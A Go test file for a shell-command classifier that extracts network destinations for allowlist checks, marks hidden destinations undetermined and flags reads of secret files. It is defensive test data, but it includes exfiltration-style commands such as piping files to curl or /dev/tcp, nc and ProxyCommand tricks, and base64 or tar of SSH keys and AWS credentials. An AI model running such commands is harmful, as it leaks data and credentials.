package shellscan

import (
	"sort"
	"strings"
	"testing"
)

// undetermined is the literal a network fact carries when the scanner cannot
// name every destination. The test spells it out so a change to the exported
// sentinel is a visible contract change.
const undetermined = "<undetermined>"

func networkTargets(res Result) []string {
	var targets []string
	for _, fact := range res.EffectFacts {
		if fact.Class == "network" {
			targets = append(targets, fact.Target)
		}
	}
	sort.Strings(targets)
	return targets
}

func sameTargets(got, want []string) bool {
	want = append([]string(nil), want...)
	sort.Strings(want)
	if len(got) != len(want) {
		return false
	}
	for i := range got {
		if got[i] != want[i] {
			return false
		}
	}
	return true
}

// Every destination a command can reach is a fact of its own, in the
// canonical scheme://host[:port] form the allowlist is compared against.
func TestClassifyNamesEveryEgressDestination(t *testing.T) {
	cases := []struct {
		name    string
		command string
		want    []string
	}{
		{"two URLs", "curl https://allowed.example/x https://other.example/y", []string{"https://allowed.example", "https://other.example"}},
		{"second URL first", "curl https://other.example/y https://allowed.example/x", []string{"https://allowed.example", "https://other.example"}},
		{"same host twice", "curl https://allowed.example/a https://allowed.example/b", []string{"https://allowed.example"}},
		{"userinfo host", "curl https://allowed.example@other.example/", []string{"https://other.example"}},
		{"userinfo with password", "curl https://allowed.example:pw@other.example/", []string{"https://other.example"}},
		{"query is not a host", "curl 'https://other.example/?next=https://allowed.example/'", []string{"https://other.example"}},
		{"lookalike suffix", "curl https://allowed.example.other.example/", []string{"https://allowed.example.other.example"}},
		{"scheme-less URL defaults to http", "curl allowed.example/x", []string{"http://allowed.example"}},
		{"scheme-less userinfo", "curl allowed.example@other.example", []string{"http://other.example"}},
		{"explicit default port", "curl https://allowed.example:443/x", []string{"https://allowed.example"}},
		{"non-default port", "curl https://allowed.example:8443/x", []string{"https://allowed.example:8443"}},
		{"case and trailing dot", "curl https://ALLOWED.Example./x", []string{"https://allowed.example"}},
		{"IPv6 literal with port", "curl 'http://[2001:DB8::1]:8080/x'", []string{"http://[2001:db8::1]:8080"}},
		{"IPv4-mapped IPv6", "curl 'http://[::ffff:192.0.2.7]/'", []string{"http://192.0.2.7"}},
		{"IDN host", "curl https://bücher.example/", []string{"https://xn--bcher-kva.example"}},
		{"punycode host", "curl https://xn--bcher-kva.example/", []string{"https://xn--bcher-kva.example"}},
		{"--url option", "curl --url https://other.example/ https://allowed.example/", []string{"https://allowed.example", "https://other.example"}},
		{"--next group", "curl https://allowed.example/ --next -d x https://other.example/", []string{"https://allowed.example", "https://other.example"}},
		{"option values are not URLs", "curl -sS -o out.json -H 'Accept: application/json' -d name=value https://allowed.example/", []string{"https://allowed.example"}},
		{"attached short value", "curl -ofile.json -XPOST https://allowed.example/", []string{"https://allowed.example"}},
		{"--connect-to", "curl --connect-to allowed.example:443:other.example:8443 https://allowed.example/", []string{"https://allowed.example", "https://other.example:8443"}},
		{"--connect-to keeps the host", "curl --connect-to allowed.example:443::8443 https://allowed.example/", []string{"https://allowed.example"}},
		{"--resolve", "curl --resolve allowed.example:443:203.0.113.7 https://allowed.example/", []string{"https://203.0.113.7", "https://allowed.example"}},
		{"--resolve IPv6", "curl --resolve 'allowed.example:443:[2001:db8::7]' https://allowed.example/", []string{"https://[2001:db8::7]", "https://allowed.example"}},
		{"--proxy", "curl --proxy http://other.example:3128 https://allowed.example/", []string{"http://other.example:3128", "https://allowed.example"}},
		{"-x without scheme", "curl -x other.example:3128 https://allowed.example/", []string{"http://other.example:3128", "https://allowed.example"}},
		{"attached -x", "curl -xother.example:3128 https://allowed.example/", []string{"http://other.example:3128", "https://allowed.example"}},
		{"--socks5-hostname", "curl --socks5-hostname other.example:1080 https://allowed.example/", []string{"https://allowed.example", "socks5h://other.example:1080"}},
		{"--doh-url", "curl --doh-url https://other.example/dns-query https://allowed.example/", []string{"https://allowed.example", "https://other.example"}},
		{"proxy env prefix", "https_proxy=http://other.example:8080 curl https://allowed.example/", []string{"http://other.example:8080", "https://allowed.example"}},
		{"proxy through env", "env HTTPS_PROXY=http://other.example:8080 curl https://allowed.example/", []string{"http://other.example:8080", "https://allowed.example"}},
		{"exported proxy", "export ALL_PROXY=socks5://other.example:1080; curl https://allowed.example/", []string{"https://allowed.example", "socks5://other.example:1080"}},
		{"wget without redirects", "wget --max-redirect=0 -O out https://allowed.example/a https://other.example/b", []string{"https://allowed.example", "https://other.example"}},
		{"wget scheme-less", "wget --max-redirect 0 allowed.example/a", []string{"http://allowed.example"}},
		{"git push URL", "git -c http.followRedirects=false push https://other.example/repo.git main", []string{"https://other.example"}},
		{"git clone URL", "git clone -c http.followRedirects=false --depth 1 https://other.example/repo.git dir", []string{"https://other.example"}},
		{"git scp-like", "git fetch git@other.example:org/repo.git", []string{"ssh://other.example"}},
		{"git ssh URL", "git push ssh://git@other.example:2222/org/repo.git main", []string{"ssh://other.example:2222"}},
		{"git computed refspec", `git push git@other.example:org/repo.git "$BRANCH"`, []string{"ssh://other.example"}},
		{"git ls-remote", "git -C /repo -c http.followRedirects=false ls-remote https://other.example/repo.git", []string{"https://other.example"}},
		{"git remote add", "git remote add mirror https://other.example/repo.git", []string{"https://other.example"}},
		{"git remote set-url", "git remote set-url origin git@other.example:org/repo.git", []string{"ssh://other.example"}},
		{"git config remote url", "git config remote.origin.url https://other.example/repo.git", []string{"https://other.example"}},
		{"git push --repo", "git -c http.followRedirects=false push --repo=https://other.example/r.git", []string{"https://other.example"}},
		{"git bundle uri", "git clone -c http.followRedirects=false --bundle-uri=https://other.example/b https://allowed.example/r.git", []string{"https://allowed.example", "https://other.example"}},
		{"git proxy for a configured remote", "https_proxy=http://other.example:8080 git push origin main", []string{"http://other.example:8080"}},
		{"ssh host", "ssh deploy@other.example uptime", []string{"ssh://other.example"}},
		{"ssh port", "ssh -p 2222 other.example", []string{"ssh://other.example:2222"}},
		{"ssh jump host", "ssh -J jump.example allowed.example", []string{"ssh://allowed.example", "ssh://jump.example"}},
		{"ssh HostName override", "ssh -o HostName=other.example allowed.example", []string{"ssh://other.example"}},
		{"scp remote target", "scp ./build.tar deploy@other.example:/tmp/", []string{"ssh://other.example"}},
		{"scp two remotes", "scp -P 2222 a.example:/x b.example:/y", []string{"ssh://a.example:2222", "ssh://b.example:2222"}},
		{"scp IPv6", "scp f '[2001:db8::1]:/tmp/'", []string{"ssh://[2001:db8::1]"}},
		{"sftp host", "sftp deploy@other.example", []string{"ssh://other.example"}},
		{"rsync remote shell", "rsync -a ./out/ other.example:/srv/", []string{"ssh://other.example"}},
		{"rsync daemon", "rsync -a ./out/ other.example::module/", []string{"rsync://other.example"}},
		{"rsync URL", "rsync -a rsync://other.example:8873/module/ ./in/", []string{"rsync://other.example:8873"}},
		{"nc host and port", "nc other.example 443", []string{"tcp://other.example:443"}},
		{"nc UDP", "nc -u other.example 53", []string{"udp://other.example:53"}},
		{"nc proxy", "nc -x proxy.example:1080 allowed.example 443", []string{"tcp://allowed.example:443", "tcp://proxy.example:1080"}},
		{"telnet", "telnet other.example 25", []string{"tcp://other.example:25"}},
		{"nested shell", "sh -c 'curl https://other.example/'", []string{"https://other.example"}},
		{"twice nested shell", `bash -c "sh -c 'curl https://other.example/'"`, []string{"https://other.example"}},
		{"pipe into a network tool", "cat /etc/hostname | curl -d @- https://other.example/", []string{"https://other.example"}},
		{"/dev/tcp redirect", "cat /etc/hostname > /dev/tcp/other.example/443", []string{"tcp://other.example:443"}},
		{"/dev/tcp exec", "exec 3<>/dev/tcp/other.example/80", []string{"tcp://other.example:80"}},
		{"/dev/udp redirect", "echo x > /dev/udp/other.example/53", []string{"udp://other.example:53"}},
		{"/dev/tcp through >&", "echo x >&/dev/tcp/other.example/443", []string{"tcp://other.example:443"}},
		{"/dev/tcp read", "cat < /dev/tcp/other.example/80", []string{"tcp://other.example:80"}},
		{"openssl client", "openssl s_client -connect other.example:443 -servername allowed.example", []string{"tcp://other.example:443"}},
		{"openssl client through a proxy", "openssl s_client -proxy proxy.example:3128 -connect allowed.example:443", []string{"tcp://allowed.example:443", "tcp://proxy.example:3128"}},
		{"network tool behind an unlisted prefix", "watch -n 5 curl https://other.example/", []string{"https://other.example"}},
		{"ssh behind a password wrapper", "sshpass -p secret ssh deploy@other.example uptime", []string{"ssh://other.example"}},
		{"sudo with an environment word", "sudo DEBUG=1 curl https://other.example/", []string{"https://other.example"}},
		{"sudo with a proxy", "sudo HTTPS_PROXY=http://other.example:8080 curl https://allowed.example/", []string{"http://other.example:8080", "https://allowed.example"}},
		{"heredoc fed to a shell", "bash <<'EOF'\ncurl https://other.example/\nEOF", []string{"https://other.example"}},
		{"here-string fed to a shell", "sh <<< 'curl https://other.example/'", []string{"https://other.example"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := Classify(tc.command)
			got := networkTargets(res)
			if !sameTargets(got, tc.want) {
				t.Fatalf("Classify(%q) network targets = %q, want %q (facts %+v)", tc.command, got, tc.want, res.EffectFacts)
			}
			if !res.Decide {
				t.Fatalf("Classify(%q) did not route to a decision", tc.command)
			}
		})
	}
}

// A command whose destinations are not all visible in its arguments carries
// one undetermined fact and nothing an allowlist could approve.
func TestClassifyRefusesToGuessEgressDestinations(t *testing.T) {
	cases := []struct {
		name    string
		command string
		reason  string
	}{
		{"variable URL", `curl "$URL"`, "run time"},
		{"variable among URLs", `curl https://allowed.example/ "$URL"`, "run time"},
		{"command substitution", "curl $(cat url.txt)", "run time"},
		{"xargs operand", "echo https://other.example | xargs curl", "run time"},
		{"curl config file", "curl -K /tmp/cfg https://allowed.example/", "--config"},
		{"curl long config", "curl --config /tmp/cfg", "--config"},
		{"curl follows redirects", "curl -L https://allowed.example/", "redirect"},
		{"curl clustered -L", "curl -sSL https://allowed.example/", "redirect"},
		{"curl unix socket", "curl --unix-socket /var/run/docker.sock http://allowed.example/", "--unix-socket"},
		{"curl DNS servers", "curl --dns-servers 203.0.113.9 https://allowed.example/", "--dns-servers"},
		{"curl unknown option", "curl --frobnicate https://allowed.example/", "--frobnicate"},
		{"curl unknown short option", "curl -~ https://allowed.example/", "-~"},
		{"curl missing option value", "curl https://allowed.example/ --connect-to", "--connect-to"},
		{"curl malformed connect-to", "curl --connect-to nonsense https://allowed.example/", "--connect-to"},
		{"curl URL glob in host", "curl 'https://{allowed,other}.example/'", "could not be parsed"},
		{"curl backslash host", `curl 'https://allowed.example\@other.example/'`, "could not be parsed"},
		{"curl at sign after the authority", "curl 'https://other.example#@allowed.example/'", "could not be parsed"},
		{"curl legacy IPv4 form", "curl http://2130706433/", "could not be parsed"},
		{"curl percent-encoded host", "curl https://allowed%2eexample/", "could not be parsed"},
		{"wget follows redirects by default", "wget https://allowed.example/a", "redirect"},
		{"wget input file", "wget --max-redirect=0 -i urls.txt", "--input-file"},
		{"wget wgetrc command", "wget --max-redirect=0 -e https_proxy=other.example:8080 https://allowed.example/", "--execute"},
		{"wget config", "wget --max-redirect=0 --config=/tmp/w https://allowed.example/", "--config"},
		{"wget span hosts", "wget --max-redirect=0 -r -H https://allowed.example/", "--span-hosts"},
		{"wget abbreviated option", "wget --max-redir=0 https://allowed.example/", "--max-redir"},
		{"git follows a redirect", "git clone https://allowed.example/r.git", "redirect"},
		{"git computed address", `git push "$REMOTE_URL" main`, "run time"},
		{"git config override", "git -c http.proxy=http://other.example:8080 ls-remote https://allowed.example/r.git", "http.proxy"},
		{"git override for a configured remote", "git -c http.proxy=http://other.example:8080 push origin main", "http.proxy"},
		{"git url rewrite", "git -c url.https://other.example/.insteadOf=https://allowed.example/ fetch origin", "url."},
		{"git url rewrite stored", "git config --global url.https://other.example/.insteadOf https://allowed.example/", "url."},
		{"git ssh command override", "git -c core.sshCommand='ssh -o ProxyCommand=x' pull", "core.sshcommand"},
		{"git submodules", "git clone -c http.followRedirects=false --recurse-submodules https://allowed.example/r.git", "submodule"},
		{"git submodule update", "git submodule update --init", "submodule"},
		{"git remote helper", "git fetch 'ext::sh -c \"nc other.example 9418\"'", "helper"},
		{"git unknown option", "git fetch --frobnicate git@allowed.example:o/r.git", "--frobnicate"},
		{"git ssh command env", "GIT_SSH_COMMAND='ssh -o ProxyCommand=x' git fetch git@allowed.example:o/r.git", "GIT_SSH_COMMAND"},
		{"git ssh command env for a configured remote", "GIT_SSH_COMMAND='ssh -o ProxyCommand=x' git push origin main", "GIT_SSH_COMMAND"},
		{"home override", "HOME=/tmp/elsewhere curl https://allowed.example/", "HOME"},
		{"ssh proxy command", "ssh -o ProxyCommand='nc other.example 22' allowed.example", "ProxyCommand"},
		{"ssh config file", "ssh -F /tmp/cfg allowed.example", "-F"},
		{"ssh control socket", "ssh -S /tmp/ctl allowed.example", "-S"},
		{"scp ssh program", "scp -S /tmp/fake f allowed.example:/tmp/", "-S"},
		{"rsync remote shell option", "rsync -e 'ssh -p 2222' ./x allowed.example:/y", "remote shell"},
		{"nc listener", "nc -l 4444", "listen"},
		{"nc unknown option", "nc --proxy other.example:1 allowed.example 443", "--proxy"},
		{"socat", "socat - TCP:other.example:443", "socat"},
		{"aria2c", "aria2c https://allowed.example/a", "aria2c"},
		{"ftp", "ftp other.example", "ftp"},
		{"httpie", "http GET https://allowed.example/", "http"},
		{"dynamic /dev/tcp", `echo x > "/dev/tcp/$H/443"`, "run time"},
		{"proxy wrapper", "proxychains curl https://allowed.example/", "proxychains"},
		{"openssl unix socket", "openssl s_client -unix /var/run/x.sock", "-unix"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			res := Classify(tc.command)
			got := networkTargets(res)
			if !sameTargets(got, []string{undetermined}) {
				t.Fatalf("Classify(%q) network targets = %q, want only %q (facts %+v)", tc.command, got, undetermined, res.EffectFacts)
			}
			var reason string
			for _, fact := range res.EffectFacts {
				if fact.Class == "network" {
					reason = fact.Reason
				}
			}
			if !strings.Contains(reason, "could not be determined") || !strings.Contains(reason, tc.reason) {
				t.Fatalf("Classify(%q) reason = %q, want it to say the destination could not be determined and mention %q", tc.command, reason, tc.reason)
			}
		})
	}
}

// Invocations that open no connection stay out of the decision path.
func TestClassifyLeavesOfflineNetworkToolsAlone(t *testing.T) {
	for _, command := range []string{
		"curl --version",
		"curl --help",
		"wget --version",
		"git status",
		"git log --oneline -5",
		"git config --get remote.origin.url",
		"git config user.name agent",
		"git remote -v",
		// A configured remote is the operator's setting, not a destination the
		// command line chose.
		"git push origin main",
		"git push -u origin feature",
		`git push origin "$BRANCH"`,
		"git pull",
		"git pull --rebase origin main",
		"git fetch --all --prune",
		"git remote update",
		"git remote add local ../other-checkout",
		"git clone /srv/git/repo.git ./repo",
		"git clone ./local.git copy",
		"ssh -V",
		"scp ./a ./b",
		"rsync -a ./a/ ./b/",
		"curl file:///tmp/readme.txt",
		"openssl dgst -sha256 file.bin",
		"openssl enc -base64 -in file.bin",
		`openssl dgst -sha256 "$FILE"`,
		"brew install curl wget",
		"echo curl https://other.example/",
		"echo done 2>&1",
		"make build >&2",
		"exec 3>&-",
	} {
		if res := Classify(command); len(networkTargets(res)) != 0 {
			t.Errorf("Classify(%q) network targets = %q, want none", command, networkTargets(res))
		}
	}
}

func TestClassifyRoutesReadsOfSecretsThroughAnyCommand(t *testing.T) {
	cases := []struct {
		command string
		target  string
	}{
		{"base64 /home/agent/.ssh/id_rsa", "/home/agent/.ssh/id_rsa"},
		{"xxd -p /home/agent/.ssh/id_ed25519", "/home/agent/.ssh/id_ed25519"},
		{"od -c .env", ".env"},
		{"strings /srv/app/server.pem", "/srv/app/server.pem"},
		{"openssl enc -base64 -in /home/agent/.aws/credentials", "/home/agent/.aws/credentials"},
		{"dd if=/home/agent/.ssh/id_rsa of=/tmp/k", "/home/agent/.ssh/id_rsa"},
		{"python3 dump.py /home/agent/.ssh/id_rsa", "/home/agent/.ssh/id_rsa"},
		{"vim .env", ".env"},
		{"git add .env", ".env"},
		{`cat "/home/agent/My Files/.env"`, "/home/agent/My Files/.env"},
		{"docker compose --env-file .env.production up", ".env.production"},
		{"tar czf /tmp/s.tgz /home/agent/.ssh/", "/home/agent/.ssh/"},
		{"base64 < /home/agent/.ssh/id_rsa", "/home/agent/.ssh/id_rsa"},
		{"curl file:///home/agent/.ssh/id_rsa", "/home/agent/.ssh/id_rsa"},
	}
	for _, tc := range cases {
		res := Classify(tc.command)
		found := false
		for _, fact := range res.EffectFacts {
			if fact.Class == "secret" && fact.Action == "secret_read" && fact.Target == tc.target {
				found = true
			}
		}
		if !found || !res.Decide {
			t.Errorf("Classify(%q) facts = %+v, want a secret read of %q", tc.command, res.EffectFacts, tc.target)
		}
	}
	for _, command := range []string{
		"ls -la .env",
		"test -f .env",
		"chmod 600 /home/agent/.ssh/id_rsa",
		"mkdir -p /home/agent/.ssh",
		"echo .env",
		`git commit -m "load settings from .env at startup"`,
		`gh pr create --title "Rotate the .pem bundle"`,
	} {
		res := Classify(command)
		for _, fact := range res.EffectFacts {
			if fact.Class == "secret" {
				t.Errorf("Classify(%q) reported a secret read (%+v) for a command that discloses no content", command, fact)
			}
		}
	}
}

// Configuration files that redirect a network client run as policy the next
// time the client starts, so writing them is a sensitive write.
func TestSensitiveWriteTargetCoversNetworkClientConfig(t *testing.T) {
	for _, target := range []string{"/home/agent/.curlrc", "/home/agent/.wgetrc", "~/.config/curlrc"} {
		if _, ok := SensitiveWriteTarget(target, "/repo"); !ok {
			t.Errorf("SensitiveWriteTarget(%q) = false, want true", target)
		}
	}
}
